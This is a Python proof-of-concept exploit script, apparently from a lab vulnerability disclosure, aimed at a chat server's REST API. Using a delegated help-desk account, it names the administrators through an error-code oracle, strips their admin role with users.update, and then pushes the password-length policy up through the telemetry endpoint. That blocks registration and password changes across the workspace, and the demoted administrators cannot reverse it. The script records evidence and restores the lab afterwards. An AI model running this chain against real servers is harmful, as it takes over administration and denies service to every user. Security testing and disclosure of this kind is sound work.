_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    """One status line: coloured on a live terminal, plain in run.log."""
    if _TERM_IS_TTY and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}", flush=True)
    else:
        print(f"[{tag}] {msg}", flush=True)


def rand(n=4):
    """A short random suffix so accounts, uploads and tokens never collide."""
    return secrets.token_hex(n)


def save(name, text):
    """Write evidence beside the script (request.http, response.txt, ...)."""
    path = os.path.join(HERE, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def verdict(status, summary):
    """The one standard line a run ends on; returns the process exit code."""
    day = _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%d")
    status = status.strip().upper()
    log("OK" if status == "CONFIRMED" else "FAIL", f"{VULN} {status}")
    print(f"==> {VULN} {status} {day} - {summary}", flush=True)
    return 0 if status == "CONFIRMED" else 1
# --- end preamble ---

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")                 # manifest admin: the demoted victim
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Bspdr-Lab-Adm1n!")      # manifest admin password
POLICY = "Accounts_Password_Policy_MinLength"                      # the step-3 target
PROBE = "Accounts_TwoFactorAuthentication_MaxDelta"                # a protected setting, read as a privilege test
POLICY_BUMP = int(os.environ.get("CHAIN_POLICY_BUMP", "400"))      # how far to push the minimum length
BATCH = int(os.environ.get("CHAIN_TELEMETRY_BATCH", "50"))         # increments per telemetry request
# What the administrator delegates to the help-desk role, and what it keeps.
DELEGATED = ("assign-roles", "edit-other-user-info", "view-full-other-user-info")


def api(sess, method, path, **kw):
    return sess.request(method, f"{BASE_URL}{path}", timeout=60, **kw)


def login(username, password):
    s = requests.Session()
    r = api(s, "POST", "/api/v1/login", json={"user": username, "password": password})
    d = r.json()
    if d.get("status") != "success":
        raise RuntimeError(f"login {username} failed: {r.status_code} {r.text[:200]}")
    s.headers.update({"X-Auth-Token": d["data"]["authToken"], "X-User-Id": d["data"]["userId"]})
    return s


def mkuser(adm, name, pw, roles=("user",)):
    r = api(adm, "POST", "/api/v1/users.create", json={
        "username": name, "name": name, "email": f"{name}@lab.invalid", "password": pw,
        "roles": list(roles), "joinDefaultChannels": False, "verified": False,
        "requirePasswordChange": False})
    if not r.json().get("success"):
        raise RuntimeError(f"could not create {name}: {r.text[:200]}")
    return r.json()["user"]["_id"]


def rmuser(adm, uid):
    api(adm, "POST", "/api/v1/users.delete", json={"userId": uid, "confirmRelinquish": True})


def banner(title):
    print("=" * 72)
    print(f"{VULN}: {title}")
    print(f"target : {BASE_URL}")
    print("author : Blue Spider")
    print("=" * 72)


def tfa(password):
    """The password-fallback second factor an administrator's settings write needs."""
    return {"x-2fa-method": "password", "x-2fa-code": hashlib.sha256(password.encode()).hexdigest()}


def get_setting(sess, sid):
    r = api(sess, "GET", f"/api/v1/settings/{sid}")
    return r.status_code, (r.json().get("value") if r.status_code == 200 else r.json())


def set_setting(sess, sid, value, password):
    return api(sess, "POST", f"/api/v1/settings/{sid}", json={"value": value},
               headers=tfa(password))


def roles_of(sess, uid):
    return ((api(sess, "GET", f"/api/v1/users.info?userId={uid}").json().get("user") or {})
            .get("roles"))


def oracle(sess, username, role="admin"):
    """VULN-020: one question, answered by the error code. `already in role`
    means yes, `not allowed` means no. No permission is needed to ask."""
    r = api(sess, "POST", "/api/v1/roles.addUserToRole",
            json={"roleId": role, "username": username})
    err = r.json().get("errorType") or r.json().get("error") or ""
    return r, err, ("yes" if "already-in-role" in err else
                    "no" if ("not-allowed" in err or "not have the permission" in r.text) else
                    f"?({err})")


def bump(sess, sid, times):
    """VULN-057: raise a numeric setting by `times`, in telemetry batches."""
    sent, r = 0, None
    while sent < times:
        n = min(BATCH, times - sent)
        r = api(sess, "POST", "/api/v1/statistics.telemetry",
                json={"params": [{"eventName": "updateCounter", "settingsId": sid}
                                 for _ in range(n)]})
        if r.status_code != 200:
            return sent, r
        sent += n
        time.sleep(0.6)             # the handler fires the writes without awaiting them
    return sent, r


def perm_roles(sess, perm):
    cur = api(sess, "GET", "/api/v1/permissions.listAll").json()
    return next((p.get("roles") for p in cur.get("update", []) if p.get("_id") == perm), [])


def grant(adm, perm, role):
    """Delegate one permission to a role, exactly as an administrator does it on
    the admin Permissions screen. Returns the previous role list, so the run can
    put the permission back byte for byte."""
    was = list(perm_roles(adm, perm) or [])
    api(adm, "POST", "/api/v1/permissions.update",
        json={"permissions": [{"_id": perm, "roles": sorted(set(was) | {role})}]})
    return was


def main():
    sfx = rand()
    banner("a delegated help-desk role removes every administrator, then breaks what only they could fix")
    log("INFO", "chaining VULN-020 (the role oracle) -> VULN-069 (users.update strips admin) -> "
                "VULN-057 (statistics.telemetry writes a policy nobody is left to undo)")
    adm = login(ADMIN_USER, ADMIN_PASS)
    adm_uid = adm.headers["X-User-Id"]
    pw = f"Lab-Pass-{sfx}!A"
    ev = {"workspace_admin": ADMIN_USER}

    # [SETUP] the safety net, created first: a spare administrator that this run
    # never demotes, so the workspace is never left ownerless and everything can
    # be put back. It is deleted at the end.
    spare, spare_uid = f"spare_{sfx}", None
    spare_uid = mkuser(adm, spare, pw, roles=("admin", "user"))
    ss = login(spare, pw)
    log("SETUP", f"safety net: {spare} is a spare administrator, kept alive so the lab can be "
                 f"restored; it is deleted at the end")

    # [SETUP] the delegation an administrator would make on the admin
    # Permissions screen: the help-desk role may manage users and assign roles,
    # and assign-admin-role is deliberately withheld. The role is the built-in
    # `moderator`, because creating a custom role is a premium feature this
    # Community workspace refuses ("This is an enterprise feature"); the
    # delegation itself is a Community capability and the permissions are put
    # back exactly as they were at the end.
    role = "moderator"
    granted = {}
    for perm in DELEGATED:
        granted[perm] = grant(adm, perm, role)
    atk, atk_uid = f"desk_{sfx}", None
    atk_uid = mkuser(adm, atk, pw, roles=("user", role))
    time.sleep(2)
    sa = login(atk, pw)
    perms = api(adm, "GET", "/api/v1/permissions.listAll").json()
    holders = next((p.get("roles") for p in perms.get("update", [])
                    if p.get("_id") == "assign-admin-role"), [])
    log("SETUP", f"attacker {atk} holds {role}, which the administrator just granted "
                 f"{', '.join(DELEGATED)} (previously {json.dumps(granted)}); assign-admin-role "
                 f"stays with {holders}")
    ev["delegated_role"] = {"name": role, "permissions": list(DELEGATED),
                            "permission_roles_before": granted,
                            "assign_admin_role_holders": holders}

    before_doc = (api(ss, "GET", f"/api/v1/users.info?userId={adm_uid}").json().get("user") or {})
    ev["admin_before"] = {k: before_doc.get(k) for k in
                          ("username", "roles", "active", "type", "emails")}
    demoted, restored_ok = [], False
    try:
        # ------------------------------------------------------------- step 1
        # VULN-020: who are the administrators? The oracle answers without any
        # permission to read roles (the attacker cannot read the role map, and
        # access-permissions belongs to admin alone).
        log("STEP", "1/3 VULN-020: sweep the workspace's accounts through roles.addUserToRole and "
                    "read each answer from the error code")
        names = [u.get("username") for u in
                 (api(sa, "GET", "/api/v1/users.list?count=200").json().get("users") or [])
                 if u.get("username")]
        answers = {}
        for n in names:
            _, err, ans = oracle(sa, n)
            answers[n] = ans
        admins = sorted(n for n, a in answers.items() if a == "yes")
        truth = sorted(u.get("username") for u in
                       (api(ss, "GET", "/api/v1/roles.getUsersInRole?role=admin&count=100")
                        .json().get("users") or []))
        log("PROOF" if set(admins) == set(truth) else "FAIL",
            f"    the oracle answered for {len(names)} accounts and named the administrators "
            f"{admins}; the administrator's own view of the admin role is {truth} "
            f"(identical={set(admins) == set(truth)})")
        ev["step1_oracle"] = {"accounts_probed": len(names), "oracle_says": admins,
                              "admin_view": truth}
        save("evidence/step1-role-oracle.json", json.dumps(answers, indent=2))

        # ------------------------------------------------------------- step 2
        # VULN-069: strip the admin role from every administrator the oracle
        # named, except the spare this run created as its safety net.
        log("STEP", "2/3 VULN-069: users.update with a roles array that omits admin, for every "
                    "administrator found (the spare is left alive on purpose)")
        promote = api(sa, "POST", "/api/v1/users.update",
                      json={"userId": atk_uid, "data": {"roles": ["user", "admin"]}})
        log("INFO", f"    the promotion side is guarded, so this is one-way: users.update adding "
                    f"admin -> HTTP {promote.status_code} {promote.text[:110]}")
        targets = [n for n in admins if n != spare]
        for n in targets:
            uid = next((u.get("_id") for u in
                        (api(sa, "GET", f"/api/v1/users.list?count=200").json().get("users") or [])
                        if u.get("username") == n), None)
            if not uid:
                continue
            body = {"userId": uid, "data": {"roles": ["user"]}}
            r = api(sa, "POST", "/api/v1/users.update", json=body)
            after = roles_of(ss, uid)
            demoted.append((n, r.status_code, after))
            if n == ADMIN_USER:
                save("request.http",
                     f"POST /api/v1/users.update HTTP/1.1\r\nHost: {BASE_URL.split('//', 1)[1]}\r\n"
                     f"X-Auth-Token: {sa.headers['X-Auth-Token']}\r\nX-User-Id: {atk_uid}\r\n"
                     f"Content-Type: application/json\r\n\r\n{json.dumps(body)}")
                save("response.txt", f"HTTP/1.1 {r.status_code}\n"
                     + "".join(f"{k}: {v}\n" for k, v in r.headers.items()) + "\n" + r.text)
        stripped = [d for d in demoted if "admin" not in (d[2] or [])]
        log("PROOF" if stripped else "FAIL",
            f"    demoted {[(n, s) for n, s, _ in demoted]}: the workspace's own {ADMIN_USER} "
            f"account now holds {roles_of(ss, adm_uid)}")
        # the decisive privilege test: the real administrator's own session.
        st_read, _ = get_setting(adm, PROBE)
        st_write = set_setting(adm, PROBE, 1, ADMIN_PASS)
        log("PROOF" if st_read != 200 else "FAIL",
            f"    with its own, still-valid session the demoted administrator reads a protected "
            f"setting -> HTTP {st_read} and writes one -> HTTP {st_write.status_code}: it is an "
            f"ordinary user now")
        remaining = sorted(u.get("username") for u in
                           (api(ss, "GET", "/api/v1/roles.getUsersInRole?role=admin&count=100")
                            .json().get("users") or []))
        log("PROOF", f"    administrators remaining in the workspace: {remaining} (only the spare "
                     f"this run created; the same call removes it, which would leave none)")
        ev["step2_demotion"] = {"promotion_refused": promote.status_code,
                                "demoted": demoted,
                                "admin_roles_after": roles_of(ss, adm_uid),
                                "demoted_admin_setting_read": st_read,
                                "demoted_admin_setting_write": st_write.status_code,
                                "admins_remaining": remaining}

        # ------------------------------------------------------------- step 3
        # VULN-057: damage that needs an administrator to undo, done when there
        # is none. Raising the minimum password length refuses every
        # registration, password change and password reset workspace-wide.
        log("STEP", f"3/3 VULN-057: raise {POLICY} by {POLICY_BUMP} through statistics.telemetry, "
                    f"as the same help-desk account")
        base_code, base_val = get_setting(ss, POLICY)
        sent, last = bump(sa, POLICY, POLICY_BUMP)
        time.sleep(3)
        _, now_val = get_setting(ss, POLICY)
        probe_user = f"newjoiner_{sfx}"
        reg = requests.post(f"{BASE_URL}/api/v1/users.register",
                            json={"username": probe_user, "email": f"{probe_user}@lab.invalid",
                                  "pass": f"Perfectly-Fine-{sfx}!A", "name": probe_user}, timeout=30)
        chg = api(sa, "POST", "/api/v1/users.updateOwnBasicInfo",
                  json={"data": {"newPassword": f"Another-Good-{sfx}!A",
                                 "currentPassword": hashlib.sha256(pw.encode()).hexdigest()}})
        log("PROOF" if now_val and now_val > (base_val or 0) else "FAIL",
            f"    {sent} increments (last HTTP {last.status_code}): {POLICY} went from {base_val} "
            f"to {now_val}; a new user's registration with a strong password -> HTTP "
            f"{reg.status_code} {reg.json().get('error', '')[:60]}, and a password change -> HTTP "
            f"{chg.status_code} {chg.json().get('error', '')[:60]}")
        # and the point of the chain: the administrator who would fix this cannot.
        fix = set_setting(adm, POLICY, base_val, ADMIN_PASS)
        _, still = get_setting(ss, POLICY)
        log("PROOF" if fix.status_code >= 400 else "FAIL",
            f"    the workspace's own administrator trying to put {POLICY} back -> HTTP "
            f"{fix.status_code} {fix.text[:90]}; the setting is still {still}")
        ev["step3_policy"] = {"baseline": base_val, "now": now_val, "increments": sent,
                              "registration": {"status": reg.status_code, "body": reg.text[:200]},
                              "password_change": {"status": chg.status_code, "body": chg.text[:200]},
                              "demoted_admin_repair_attempt": {"status": fix.status_code,
                                                               "body": fix.text[:200]},
                              "value_after_repair_attempt": still}
    finally:
        # ---------------------------------------------------------- restore
        # The spare administrator puts the workspace back: the policy value, the
        # real administrator's role, then the accounts and the role this run
        # created. Verified, and shouted about if it fails.
        log("INFO", "cleanup: the spare administrator restores the policy and the administrator role, "
                    "then everything this run created is deleted")
        try:
            set_setting(ss, POLICY, ev.get("step3_policy", {}).get("baseline") or 14, pw)
            set_setting(ss, PROBE, 1, pw)
            api(ss, "POST", "/api/v1/users.update",
                json={"userId": adm_uid, "data": {"roles": ev["admin_before"].get("roles")
                                                  or ["admin"]}})
            time.sleep(1)
            back = roles_of(ss, adm_uid)
            code_after, _ = get_setting(adm, PROBE)
            restored_ok = "admin" in (back or []) and code_after == 200
            log("INFO" if restored_ok else "FAIL",
                f"    {ADMIN_USER} roles restored to {back}; its own session reads a protected "
                f"setting again -> HTTP {code_after}")
            ev["restore"] = {"admin_roles": back, "protected_read": code_after,
                             "policy": get_setting(ss, POLICY)[1]}
            for perm, was in granted.items():
                api(ss, "POST", "/api/v1/permissions.update",
                    json={"permissions": [{"_id": perm, "roles": was}]})
            log("INFO", f"    delegated permissions put back: "
                        f"{json.dumps({p: perm_roles(ss, p) for p in granted})}")
            rmuser(ss, atk_uid)
            # the spare administrator deletes itself last, through the restored admin
            adm2 = login(ADMIN_USER, ADMIN_PASS)
            rmuser(adm2, spare_uid)
            rq = requests.post(f"{BASE_URL}/api/v1/login",
                               json={"user": f"newjoiner_{sfx}", "password": f"Perfectly-Fine-{sfx}!A"},
                               timeout=30)
            if rq.json().get("status") == "success":      # if the registration had succeeded
                rmuser(adm2, rq.json()["data"]["userId"])
            log("INFO", f"    accounts and role removed; workspace administrators: "
                        f"{sorted(u.get('username') for u in (api(adm2, 'GET', '/api/v1/roles.getUsersInRole?role=admin&count=100').json().get('users') or []))}")
        except Exception as exc:                          # pragma: no cover - restore must be loud
            log("FAIL", f"    RESTORE FAILED ({exc!r}): the lab needs the admin role put back on "
                        f"{ADMIN_USER} by hand (spare administrator {spare} / {pw})")

    save("evidence/chain-004.json", json.dumps(ev, indent=2, default=str))
    ok = (bool(ev.get("step1_oracle", {}).get("oracle_says"))
          and set(ev["step1_oracle"]["oracle_says"]) == set(ev["step1_oracle"]["admin_view"])
          and "admin" not in (ev.get("step2_demotion", {}).get("admin_roles_after") or [])
          and ev.get("step2_demotion", {}).get("demoted_admin_setting_read") != 200
          and (ev.get("step3_policy", {}).get("now") or 0) > (ev.get("step3_policy", {}).get("baseline") or 0)
          and ev.get("step3_policy", {}).get("demoted_admin_repair_attempt", {}).get("status", 0) >= 400
          and restored_ok)
    if ok:
        return verdict("CONFIRMED",
                       "a help-desk role with no admin rights named the administrators through the "
                       "roles oracle, demoted the workspace's own administrator account with "
                       "users.update, raised the password policy through statistics.telemetry so that "
                       "registration and password changes fail for everyone, and the demoted "
                       "administrator was then refused when it tried to put the setting back")
    return verdict("FAILED", f"oracle={ev.get('step1_oracle', {}).get('oracle_says')} "
                             f"demotion={ev.get('step2_demotion', {}).get('admin_roles_after')} "
                             f"policy={ev.get('step3_policy', {}).get('now')} "
                             f"restored={restored_ok}")


if __name__ == "__main__":
    sys.exit(main())
